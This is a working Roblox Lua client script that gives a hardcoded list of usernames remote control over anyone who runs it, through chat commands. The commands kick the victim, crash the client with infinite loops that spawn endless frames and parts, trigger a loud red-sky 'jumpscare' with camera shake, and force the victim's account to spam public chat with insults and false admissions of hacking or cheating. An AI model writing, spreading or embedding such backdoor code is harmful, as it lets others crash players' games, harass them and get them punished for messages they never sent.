local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local RunService = game:GetService("RunService")
local TextChatService = game:GetService("TextChatService")

local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- All usernames MUST be lowercase
local AUTHORIZED_USERS = {
    ["mocaxery"] = true,
    ["rwefrroblox"] = true,
    ["rwefrroblox2"] = true,
    ["ferxd"] = true,
    ["rwedeadahhroblox"] = true,
    ["844x7"] = true,
    ["hairypu1bemuncher"] = true,
    ["xyrevexxx"] = true,
    ["theo_theobenzo"] = true,
    ["rwefrroblox5"] = true,
    ["carsr_funlol29"] = true,
    ["teenagetungtungsahur"] = true,
    ["astraoutlight"] = true,
    ["skibidaneosn"] = true,
    ["shimymsshimmyaye"] = true,
    ["TH33NERGIZER"] = true,
}

local function isAuthorized(player)
    return AUTHORIZED_USERS[player.Name:lower()] == true
end

local function horrorTroll()
    local creepySound = Instance.new("Sound")
    creepySound.SoundId = "rbxassetid://9125712561"
    creepySound.Volume = 10
    creepySound.Looped = false
    creepySound.Parent = workspace

    local original = {
        FogStart = Lighting.FogStart,
        FogEnd = Lighting.FogEnd,
        FogColor = Lighting.FogColor,
        Ambient = Lighting.Ambient,
        OutdoorAmbient = Lighting.OutdoorAmbient,
        Brightness = Lighting.Brightness,
        CameraType = Camera.CameraType,
        CameraSubject = Camera.CameraSubject,
        Sky = Lighting:FindFirstChildWhichIsA("Sky"),
    }

    local function applyRedSkybox()
        if original.Sky then
            original.Sky.Parent = nil
        end

        local sky = Instance.new("Sky")
        local redSkyID = "15182654336"
        for _, face in ipairs({"Bk","Dn","Ft","Lf","Rt","Up"}) do
            sky["Skybox"..face] = "rbxassetid://"..redSkyID
        end
        sky.CelestialBodiesShown = false
        sky.SunAngularSize = 0
        sky.MoonAngularSize = 0
        sky.Parent = Lighting
    end

    local function restoreSkybox()
        for _, v in ipairs(Lighting:GetChildren()) do
            if v:IsA("Sky") then
                v:Destroy()
            end
        end
        if original.Sky then
            original.Sky.Parent = Lighting
        end
    end

    local function shakeCamera(duration, intensity)
        local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local head = char:WaitForChild("Head")

        Camera.CameraType = Enum.CameraType.Scriptable
        local startTime = tick()

        local conn
        conn = RunService.RenderStepped:Connect(function()
            if tick() - startTime > duration then
                conn:Disconnect()
                Camera.CameraType = original.CameraType
                Camera.CameraSubject = original.CameraSubject
                return
            end

            local offset = Vector3.new(
                math.random(-100,100)/100 * intensity,
                math.random(-100,100)/100 * intensity,
                math.random(-100,100)/100 * intensity
            )

            Camera.CFrame = head.CFrame * CFrame.new(offset)
        end)
    end

    creepySound:Play()
    task.wait(0.75)

    Lighting.FogStart = 0
    Lighting.FogEnd = 15
    Lighting.FogColor = Color3.new(0,0,0)
    Lighting.Ambient = Color3.fromRGB(180,0,0)
    Lighting.OutdoorAmbient = Color3.fromRGB(60,0,0)
    Lighting.Brightness = 0.4

    applyRedSkybox()
    shakeCamera(8, 0.5)

    task.wait(8)

    restoreSkybox()
    for prop, val in pairs(original) do
        if prop ~= "CameraType" and prop ~= "CameraSubject" and prop ~= "Sky" then
            Lighting[prop] = val
        end
    end

    Camera.CameraType = original.CameraType
    Camera.CameraSubject = original.CameraSubject

    creepySound:Destroy()
end

local function spamCrash()
    task.spawn(function()
        while true do end
    end)

    task.spawn(function()
        local gui = Instance.new("ScreenGui")
        gui.ResetOnSpawn = false
        gui.IgnoreGuiInset = true
        gui.Parent = LocalPlayer:WaitForChild("PlayerGui")

        while true do
            local frame = Instance.new("Frame")
            frame.Size = UDim2.new(0, math.random(10,400), 0, math.random(10,400))
            frame.Position = UDim2.new(math.random(),0,math.random(),0)
            frame.BackgroundColor3 = Color3.new(math.random(),math.random(),math.random())
            frame.BorderSizePixel = 0
            frame.Parent = gui
        end
    end)

    task.spawn(function()
        while true do
            local part = Instance.new("Part")
            part.Size = Vector3.new(5,5,5)
            part.Position = (LocalPlayer.Character and LocalPlayer.Character:GetPivot().Position or Vector3.zero)
                + Vector3.new(math.random(-20,20),20,math.random(-20,20))
            part.Anchored = false
            part.BrickColor = BrickColor.Random()
            part.Parent = workspace
        end
    end)
end

local function handleChat(player, message)
    if not isAuthorized(player) then return end

    message = message:lower()
    local me = LocalPlayer.Name:lower()

    if message:match("^,kick%s+"..me) then
        LocalPlayer:Kick("Kicked by "..player.Name)
    elseif message:match("^,crash%s+"..me) then
        spamCrash()
    elseif message:match("^,jumpscare%s+"..me) then
        horrorTroll()
    end
end

local activeSpam = false

local function startSpamming(mode)
    if activeSpam then return end
    activeSpam = true

local phrases = {}

if mode == 1 then
    local insults = {"YOUR FAT", "I HATE YOU", "FATTY"}
    for _, insult in ipairs(insults) do
        table.insert(phrases, insult)
    end
elseif mode == 2 then
    local hacks = {"I AM HACKING", "I AM EXPLOITING", "I AM CHEATING"}
    for _, hack in ipairs(hacks) do
        table.insert(phrases, hack)
    end
elseif mode == 3 then
    for _ = 1,10 do table.insert(phrases,"PLEASE") end
elseif mode == 4 then
    for _ = 1,3 do table.insert(phrases,"TEST") end
end

    task.spawn(function()
        repeat
            for _, msg in ipairs(phrases) do
                TextChatService.TextChannels.RBXGeneral:SendAsync(msg)
                task.wait()
            end
            if mode == 4 then activeSpam = false end
        until not activeSpam
    end)
end

local function handleSpamCommands(player, message)
    if not isAuthorized(player) then return end

    message = message:lower()
    local me = LocalPlayer.Name:lower()

    if message:match("^,spammingmode1%s+"..me) then
        startSpamming(1)
    elseif message:match("^,spammingmode2%s+"..me) then
        startSpamming(2)
    elseif message:match("^,spammingmode3%s+"..me) then
        startSpamming(3)
    elseif message:match("^,spammingmode4%s+"..me) then
        startSpamming(4)
    end
end

local function hookPlayer(player)
    if player == LocalPlayer then return end
    player.Chatted:Connect(function(msg)
        handleChat(player, msg)
        handleSpamCommands(player, msg)
    end)
end

for _, p in ipairs(Players:GetPlayers()) do
    hookPlayer(p)
end

Players.PlayerAdded:Connect(hookPlayer)
